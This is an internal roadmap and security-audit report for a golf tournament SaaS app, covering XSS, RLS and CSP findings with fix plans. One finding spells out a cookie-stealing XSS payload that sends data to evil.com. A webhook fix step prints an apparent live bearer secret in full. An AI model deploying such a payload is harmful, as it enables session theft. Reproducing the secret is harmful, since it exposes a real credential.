Platform Snapshot

TOURney is a multi-tenant golf tournament SaaS PWA. One live tenant (Bova Invitational). The Bova Invitational ran as a real 3-day event — it is now a reference tenant and proof-of-concept. The platform has 11 versioned migrations, a full edge function suite (Stripe, push, email), a self-documenting ops hub at /platform, and PWA cache at tourney-v34. LLC not yet formed; Stripe live keys not set. That is the entire pre-launch gap.

§2 — Council of 5 Forward-Looking Ideas
1 — Kill CSP unsafe-inline: Extract Inline Scripts Security + UX
The CSP header exists but has unsafe-inline, which nullifies the XSS protection it's meant to provide. Every HTML page has substantial inline <script> blocks — that's the blocker. Extracting them unlocks a strict CSP, which in turn makes the _parseMentions and url innerHTML bugs unexploitable at the browser level even before the code fixes land.
Build Plan
  • Pick one low-complexity page (e.g. champions.html). Move all <script> content to champions.js.
  • Add nonce-based CSP or hash the script. Verify Vercel header updated.
  • Roll forward page by page over 1 sprint. Migration name: vercel.json CSP header update only.
2 — Stripe Test-Mode Dry Run: End-to-End Billing Without LLC Data + Business
create-checkout and stripe-webhook are fully wired — JWT auth, sig verification, 4 event types, DB columns all done. The only missing piece before LLC is pointing them at Stripe test keys. Running a full test-mode checkout → webhook → billing_status flow validates the entire pipeline before real money flows.
Build Plan
  • Create Stripe test account. Set STRIPE_SECRET_KEY (test), STRIPE_WEBHOOK_SECRET (test), STRIPE_PRICE_PLAYER (test price ID) as Supabase edge fn secrets.
  • Register webhook at jllugkiojeoopitdvzsa.supabase.co/functions/v1/stripe-webhook.
  • Walk /player-upgrade full flow. Confirm player_accounts.billing_status updates. No code changes needed.
3 — Post-Round Score Summary Email via send-install-email Infrastructure UX + Retention
send-install-email v6 is deployed and has the webhook gate pattern established. The same infrastructure can power a post-round email blast — "Round 1 complete. Leaderboard: 1. Smith (-4), 2. Jones (-2)..." Triggered from admin.html when an admin closes a round. This turns a one-time install nudge function into a reusable email engine.
Build Plan
  • Add round_summary event type to send-install-email function (new branch in switch).
  • Collect top-5 leaderboard data from rounds + scores query. Build HTML email template (dark gold TOURney theme).
  • In admin.html, add "Email Round Summary" button in Rounds tab that POSTs to the function. Deploy as v7. Estimated: 3h dev + 30min QA.
4 — GitHub Actions Deploy Pipeline for Edge Functions Infrastructure
Currently, deploying edge functions requires a manual SUPABASE_ACCESS_TOKEN and CLI command. There's no CI/CD, no staging, and no deploy audit trail. As the function count grows (6 functions now), manual deploys are a reliability risk — wrong version, missed env var, no rollback path.
Build Plan
  • Add .github/workflows/deploy-functions.yml. Use supabase/setup-cli action.
  • Set SUPABASE_ACCESS_TOKEN + SUPABASE_PROJECT_ID as GitHub secrets.
  • Deploy all functions on push to main (path filter: supabase/functions/**). Add smoke-test step (curl the function, expect 200 or 401). Estimated: 2h setup.
5 — ToS + Privacy Pages: Pre-Launch Legal Unblock Business
Absent ToS and Privacy Policy, TOURney has GDPR/CCPA exposure and Stripe will flag the business during account review. These are also conversion blockers — players and organizers making a payment decision want to see a Privacy Policy. The /create wizard billing gate already has a placeholder for a ToS link.
Build Plan
  • Write ToS: usage terms, payment terms, content policy, disclaimer. Write Privacy Policy: data collected, Supabase storage, Stripe processor relationship, no selling of data.
  • Add tos.html + privacy.html with TOURney design system. Add /tos + /privacy rewrites in vercel.json.
  • Link from /create wizard + marketing footer. Estimated: 2–3h total.

§5 — Security Findings & Fix Plans
Methodology

Inspected all 11 migration SQL files for RLS policy definitions — specifically USING (true) predicates on sensitive tables. Grep'd innerHTML usage across all HTML and JS files (excluding .git and worktrees) to find unescaped render paths. Audited edge function auth patterns from prior session logs and grades.json security axis history. Reviewed vercel.json CSP header value. Reviewed send-push and send-install-email deployment status from qa-bugs-test-2026.md session 14 notes.

HIGH Stored XSS — feed.html:377 _parseMentions to innerHTML
feed.html:377: the _parseMentions(p.message) function output is rendered directly to innerHTML without passing through esc(). The p.message field is player-controlled trash talk submitted via the feed post form. A malicious player submits <img src=x onerror="document.location='https://evil.com?c='+document.cookie"> as a message. When any player — or admin — opens the feed, the script executes in their session. Feed is a public page visible to all tournament participants.
Fix Plan 1. Open feed.html. Find _parseMentions function (~line 370).
2. Option A (surgical): wrap final output with esc() before innerHTML — strips mention highlighting.
3. Option B (correct): build _parseMentions to return a DocumentFragment — use createElement + textContent for plain text, createElement('span') + textContent for mention spans. Append fragment instead of innerHTML. No esc() needed — DOM API is inherently safe.
4. QA: post a message containing <script>alert(1)</script>. Verify it renders as literal text, not executed JS.
HIGH Possible XSS — admin.html:~2044 and ~2194 url in innerHTML
admin.html lines approximately 2044 and 2194 render a url value directly into an innerHTML template literal. If this url field originates from player-submitted data or settings, it is an XSS vector on the admin page. Admin sessions are highest-value targets — an admin XSS would allow an attacker to extract all tournament data, modify scores, or add malicious admins.
Fix Plan 1. Open admin.html. Grep for innerHTML near lines 2044 and 2194.
2. Identify the data source of the url variable — is it from a DB column or hardcoded config?
3. If player/user-controlled: wrap with esc(url) before inserting into template literal.
4. If always a safe value (e.g., Supabase storage URL): add assertion that value starts with https://.
5. Confirm admin.html has function esc(str) defined (it does). Ensure esc is called before innerHTML in both locations.
MEDIUM RLS — player_accounts anon SELECT USING(true)
migrations/005_invitations_and_accounts.sql:41: CREATE POLICY "anon read player accounts" ON player_accounts FOR SELECT TO anon USING (true);. This allows any unauthenticated HTTP request to enumerate all player account records, including billing_status, billing_expires_at, and billing_ref. Exposing billing status across all players has compliance implications and enables targeted billing manipulation probing.
Fix Plan 1. Write migration 012_tighten_player_accounts_rls.sql.
2. Drop policy: DROP POLICY "anon read player accounts" ON player_accounts;
3. Replace: CREATE POLICY "owner read player account" ON player_accounts FOR SELECT TO authenticated USING (email = auth.email());
4. Add admin read: CREATE POLICY "admin read player accounts" ON player_accounts FOR SELECT TO authenticated USING (EXISTS (SELECT 1 FROM tournament_admins WHERE email = auth.email()));
5. Test: confirm login.html can still fetch the player's own account, and /player admin view still works.
MEDIUM CSP unsafe-inline Nullifies XSS Protection
vercel.json Content-Security-Policy header includes unsafe-inline in the script-src directive. This explicitly allows inline <script> blocks to execute, which is required because all TOURney pages use inline JavaScript. The consequence: any XSS injection (like feed.html:377) is executable — the browser won't block it even though a CSP header is present.
Fix Plan 1. Sprint: extract one page's inline JS to an external .js file (start with a small page, e.g. champions.html).
2. Test that the page functions correctly with the external file loaded via <script src="...">.
3. Once all inline scripts on a page are external, add a nonce attribute or use SHA-256 hashes in the CSP directive.
4. Update vercel.json CSP to remove unsafe-inline once all pages are migrated.
5. Multi-sprint effort — prioritize pages with known XSS vectors (feed.html, admin.html) first.
MEDIUM SEND_INSTALL_EMAIL_SECRET — Webhook Authorization Header Not Wired
send-install-email v6 is deployed to Supabase edge functions with a webhook secret gate in the function code. The SEND_INSTALL_EMAIL_SECRET env var is now set in Supabase dashboard. However, the Supabase Database Webhook (players INSERT) has not yet been updated to include the Authorization header. Gate is present in code but not enforced at runtime until the webhook header is wired. Source: ceo-tasks.json wire_install_email_webhook task.
Fix Plan (Rob manual — 5 minutes) 1. Go to Supabase Dashboard → Project jllugkiojeoopitdvzsa → Database → Webhooks.
2. Find the players INSERT webhook. Edit it.
3. Add header: Authorization: Bearer f388de9ca0f1f7f78a215d0191687fd611a5fb4d245bcd242db952d873121e94
4. Save. Test: insert a player row → verify edge function logs show authorized request.
LOW RLS — players / scores Tables May Still Have Permissive Pre-Multi-Tenant Policies
migrations/001_add_tournaments.sql:101 (comment): "Players/scores/settings: existing permissive policies stay in place. Tighten in migration 002 once all query-side filtering is confirmed working." No subsequent migration (002–011) creates tighter RLS policies on players or scores. Query-side filtering (WHERE tournament_id = ?) filters results correctly, but any authenticated user could theoretically insert or update scores across tournaments if the write policies are permissive.
Fix Plan 1. Verify live policies: Supabase dashboard → Authentication → Policies → players + scores tables.
2. If permissive INSERT/UPDATE/DELETE exist: write 012_tighten_players_scores_rls.sql (or add to existing 012 migration).

4. SELECT USING(true) is acceptable for public tournaments. Test: confirm non-admin cannot insert scores into another tournament.
